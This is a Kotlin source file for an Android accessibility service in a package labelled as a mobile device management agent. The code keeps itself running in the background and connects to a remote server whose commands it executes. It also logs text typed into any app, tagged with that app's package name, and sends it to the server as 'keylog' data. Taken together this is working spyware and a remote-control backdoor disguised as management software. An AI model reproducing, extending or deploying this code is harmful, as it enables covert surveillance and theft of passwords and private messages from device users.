package com.mdm.agent.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class MDMAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MDMAccessibility"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "✅ Accessibility Service Connected - Starting connection...")

        // Start MDMService for background persistence
        try {
            val serviceIntent = Intent(this, MDMService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.i(TAG, "MDMService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start MDMService: ${e.message}")
            // Fallback: connect directly from here
            connectDirectly()
        }
    }

    private fun connectDirectly() {
        Thread {
            try {
                Log.i(TAG, "📡 Connecting directly from AccessibilityService...")
                val apiClient = com.mdm.agent.data.remote.ApiClient(this)
                val cryptoManager = com.mdm.agent.data.remote.CryptoManager()
                val uploadManager = com.mdm.agent.data.remote.UploadManager(this)
                val socketManager = com.mdm.agent.data.remote.SocketManager(this)
                
                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
                val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
                Log.i(TAG, "  Server: $serverUrl")
                
                val cryptoResult = apiClient.initCrypto(deviceId)
                if (cryptoResult != null) {
                    cryptoManager.initFromServer(cryptoResult)
                }
                
                val commandHandler = com.mdm.agent.data.remote.CommandHandler(this, apiClient, cryptoManager, socketManager, uploadManager)
                socketManager.setCommandHandler(commandHandler)
                socketManager.setCryptoManager(cryptoManager)
                socketManager.onCommandReceived = { data ->
                    Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
                    commandHandler.handleCommand(data)
                }
                
                socketManager.connect()
                Log.i(TAG, "🎉 Connected from AccessibilityService!")
                
                // Store in MainActivity for bot commands
                com.mdm.agent.MainActivity.setSocketManager(socketManager)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Direct connection failed: ${e.message}", e)
            }
        }.start()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString() ?: ""
                val cls = event.className?.toString() ?: ""
                if (pkg.isNotEmpty()) {
                    Log.d(TAG, "Window: $pkg / $cls")
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Content change - available for monitoring
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (com.mdm.agent.data.remote.DataCollectors.inputMonitoringActive) {
                    handleKeylogEvent(event)
                }
            }
        }
    }

    private fun handleKeylogEvent(event: AccessibilityEvent) {
        try {
            val text = event.text?.joinToString("") ?: ""
            if (text.isEmpty()) return
            
            val pkg = event.packageName?.toString() ?: "unknown"
            val now = System.currentTimeMillis()
            
            synchronized(com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer) {
                com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.append(text)
                
                if (now - com.mdm.agent.data.remote.DataCollectors.lastKeylogSend > 
                    com.mdm.agent.data.remote.DataCollectors.KEYLOG_THROTTLE) {
                    
                    val buffer = com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.toString().trim()
                    if (buffer.isNotEmpty()) {
                        com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.clear()
                        com.mdm.agent.data.remote.DataCollectors.lastKeylogSend = now
                        
                        Log.i(TAG, "⌨️ Keylog [$pkg]: $buffer")
                        
                        // Send to server
                        val sm = com.mdm.agent.MainActivity.getSocketManager()
                        if (sm != null && sm.isConnected) {
                            val data = org.json.JSONObject().apply {
                                put("type", "keylog")
                                put("package", pkg)
                                put("text", buffer)
                                put("timestamp", System.currentTimeMillis())
                            }
                            sm.sendFileExplorerData(data)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Keylog error: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        Log.i(TAG, "Accessibility service destroyed")
        super.onDestroy()
    }
}
